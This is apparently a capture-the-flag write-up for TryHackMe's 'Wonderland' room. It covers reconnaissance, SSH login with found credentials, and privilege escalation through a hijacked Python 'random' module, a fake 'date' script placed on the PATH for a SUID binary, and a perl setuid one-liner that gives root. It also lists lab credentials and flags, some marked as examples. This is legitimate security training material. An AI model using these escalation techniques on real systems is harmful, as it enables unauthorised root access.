
# Wonderland 

This is a writeup for the "Wonderland" CTF challenge on TryHackMe, you can find it [here](https://tryhackme.com/room/wonderland)

---

## Objective
Retrieve two flags:
1. `user.txt`: The user flag .
2. `root.txt`: The root flag .

---

## Steps

### 1. Initial Reconnaissance
- Started the machine and noted the IP address (`[VICTIM IP]`, e.g., `10.10.59.93`).
- Ran an aggressive `nmap` scan:
  ```bash
  nmap -A -v [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -v 10.10.9.93
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS detection, version detection, scripts, traceroute).
  - `-v`: Verbose output.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH (protocol 2.0)
  80/tcp open  http    (web server, version not specified)
  ```
- Open ports: 2 (22 for SSH, 80 for HTTP).

### 2. Web Enumeration
- Visited `http://[VICTIM IP]`—saw a page with a rabbit image and quotes about following the White Rabbit.
- Checked the source code (right-click > View Page Source)—nothing notable except the rabbit image.
- Ran `gobuster` to find hidden directories:
  ```bash
  gobuster dir -u http://[VICTIM IP]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.9.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Flags explained:
  - `dir`: Directory enumeration mode.
  - `-u`: Target URL.
  - `-w`: Wordlist path.
- Results:
  ```
  /r (Status: 301)
  ```

### 3. Follow the Rabbit Hole
- Visited `http://[VICTIM IP]/r`—prompted to "keep going."
- Continued enumerating subdirectories:
  - `/r/a` → "Keep going."
  - `/r/a/b` → Another `/b`.
  - `/r/a/b/b` → More prompts.
  - `/r/a/b/b/i` → Still going.
  - `/r/a/b/b/i/t` → Landed at `/r/a/b/b/i/t` (spelling "rabbit").
- The `/r/a/b/b/i/t` page had a unique image. Checked its source code—found a credential:
  ```
  Username: alice
  Password: WhyIsARavenLikeAWritingDesk?
  ```

### 4. SSH as Alice
- Used the credential to SSH:
  ```bash
  ssh alice@[VICTIM IP]
  ```
- Example:
  ```bash
  ssh alice@10.10.9.93
  ```
- Password: `WhyIsARavenLikeAWritingDesk?`
- Accepted the host key (`yes`)—logged in as `alice`.

### 5. Explore as Alice
- Listed files in `/home/alice`:
  ```bash
  ls
  ```
- Output:
  ```
  root.txt  walrus_and_the_carpenter.py
  ```
- Tried reading `root.txt`:
  ```bash
  cat root.txt
  ```
- Failed: Permission denied.
- Viewed `walrus_and_the_carpenter.py`:
  ```bash
  cat walrus_and_the_carpenter.py
  ```
- Contained a poem (from *Alice in Wonderland*) and a line importing the `random` module:
  ```python
  import random
  ```
- Checked `/home`:
  ```bash
  ls /home
  ```
- Output: `alice hatter rabbit`—other users, but no access to their directories.
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User alice may run the following commands on wonderland:
      (rabbit) /home/alice/walrus_and_the_carpenter.py
  ```

### 6. Escalate to Rabbit
- Noticed `walrus_and_the_carpenter.py` could be run as `rabbit`. Opened it:
  ```bash
  nano walrus_and_the_carpenter.py
  ```
- Saw the `import random` line. Python searches for modules in the current directory first, so I created a malicious `random.py`:
  ```bash
  nano random.py
  ```
- Added:
  ```python
  import os
  os.system("/bin/bash")
  ```
- **Explanation**: When `walrus_and_the_carpenter.py` runs as `rabbit` and imports `random`, it executes our `random.py`, spawning a shell as `rabbit`.
- Set the PATH to prioritize `/home/alice`:
  ```bash
  export PATH=/home/alice:$PATH
  ```
- Ran the script:
  ```bash
  sudo -u rabbit /home/alice/walrus_and_the_carpenter.py
  ```
- Got a shell as `rabbit`.

### 7. Explore as Rabbit
- Listed files in `/home/rabbit`:
  ```bash
  ls
  ```
- Output: `teaParty`
- Checked `teaParty` permissions:
  ```bash
  ls -la
  ```
- Output: SUID binary owned by `hatter`.
- Ran it:
  ```bash
  ./teaParty
  ```
- Output: Displayed a date command result.
- Viewed its contents:
  ```bash
  cat teaParty
  ```
- Contained:
  ```
  /bin/echo -n 'Probably by ' && date --date='next hour' -R
  ```
- **Explanation**: The SUID binary runs as `hatter` and executes `date` from `$PATH`. We can create a fake `date` to hijack execution.

### 8. Escalate to Hatter
- Added `/home/rabbit` to `$PATH`:
  ```bash
  export PATH=/home/rabbit:$PATH
  ```
- Created a fake `date`:
  ```bash
  nano date
  ```
- Added:
  ```bash
  #!/bin/bash
  /bin/bash
  ```
- Made it executable:
  ```bash
  chmod +x date
  ```
- Ran `teaParty`:
  ```bash
  ./teaParty
  ```
- Got a shell as `hatter`.

### 9. Explore as Hatter
- Navigated to `/home/hatter`:
  ```bash
  cd /home/hatter
  ls
  ```
- Found a file with `hatter`’s password: `TryToGetThis!` (example password).
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output: No `sudo` privileges.
- Searched for `user.txt` in `/`—not found yet.

### 10. Escalate to Root
- Checked for Linux capabilities:
  ```bash
  getcap -r / 2>/dev/null
  ```
- Output:
  ```
  /usr/bin/perl5.26.1 = cap_setuid+ep
  /usr/bin/mtr-packet = cap_net_raw+ep
  /usr/bin/perl = cap_setuid+ep
  ```
- Researched `perl` on [GTFOBins](https://gtfobins.github.io/):
  ```bash
  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
  ```
- Got `Permission denied`. Checked `id`:
  ```bash
  id
  ```
- Output: Still in `rabbit`’s group.
- Switched to `hatter`:
  ```bash
  su hatter
  ```
- Password: `TryToGetThis!`
- Retried the Perl command:
  ```bash
  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
  ```
- Got a root shell (`#` prompt).

### 11. Find Flags
- Searched for flags:
  ```bash
  find / -name "*.txt" 2>/dev/null
  ```
- Found:
  - `/home/alice/root.txt`
  - `/root/user.txt` (.
- Read `user.txt`:
  ```bash
  cat /root/user.txt
  ```
- Content: `thm{"Curiouser and curiouser!"}` (example flag).
- Read `root.txt`:
  ```bash
  cat /home/alice/root.txt
  ```
- Content: `thm{"We're all mad here"}` (example flag).

---

## Flags
- **User flag**: `thm{"Curiouser and curiouser!"}`
- **Root flag**: `thm{"We're all mad here"}`

---

## Tools Used
- `nmap`: Port scanning.
- `gobuster`: Directory enumeration.
- `ssh`: Remote access.
- `nano`: File editing.
- `getcap`: Capability enumeration.
- `perl`: Privilege escalation.

---

## Lessons Learned
- **Web enumeration**: Deep directory structures can hide credentials.
- **Python imports**: Hijacking module imports (`random.py`) is a powerful escalation technique.
- **SUID binaries**: Manipulating `$PATH` to override commands (`date`) exploits SUID permissions.
- **Linux capabilities**: `cap_setuid+ep` on `perl` allows root access.
- **Group issues**: Ensure the correct user context (`su hatter`) before escalation.

---


This writeup captures my journey through the "Wonderland" CTF—down the rabbit hole and back! Let me know if you need tweaks or additional details!

---
